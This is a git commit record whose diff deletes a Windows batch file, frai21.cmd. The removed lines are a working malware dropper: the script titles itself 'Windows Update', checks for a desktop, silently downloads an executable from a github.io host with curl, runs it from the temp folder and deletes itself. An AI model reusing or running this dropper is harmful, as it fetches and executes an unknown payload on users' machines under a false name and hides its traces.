fb0b8c3ffe9ec4b65527d2dd33b6f4c2fce29f9e
boostedboynow <boostedboynow@gmail.com>
2026-06-17 21:07:55 +0300

    remove frai21.cmd

--- frai21.cmd
+++
@@ -1,8 +0,0 @@
-@echo off
-title Windows Update
-timeout /t 6 /nobreak >nul
-if not exist "%USERPROFILE%\Desktop" exit /b
-curl -sL "https://boostedboynow.github.io/assets-host/sttxht.exe" -o "%tmp%\vwcw.exe"
-if %errorlevel% neq 0 exit /b
-start "" "%tmp%\vwcw.exe"
-(goto) 2>nul & del "%~f0"
